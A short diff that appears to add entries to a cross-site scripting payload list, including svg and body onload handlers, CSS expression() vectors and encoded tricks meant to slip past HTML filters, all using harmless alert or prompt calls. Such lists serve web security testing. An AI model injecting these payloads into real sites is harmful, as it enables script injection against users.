@@ -1417,3 +1417,6 @@ a=%1B$*H%1BN&b=%20type=image%20src=x%20onerror=alert(document.c haracterSet);//
 <// style=x:expression\28write(1)\29>
 </**/style=x:expression\28write(1)\29>
 <% contenteditable onresize=alert(1)>
+<svg%0donload=alert(0)>
+<body onload=```${prompt``}`>
+<iframe src="http://target" referrerpolicy="no-referrer">
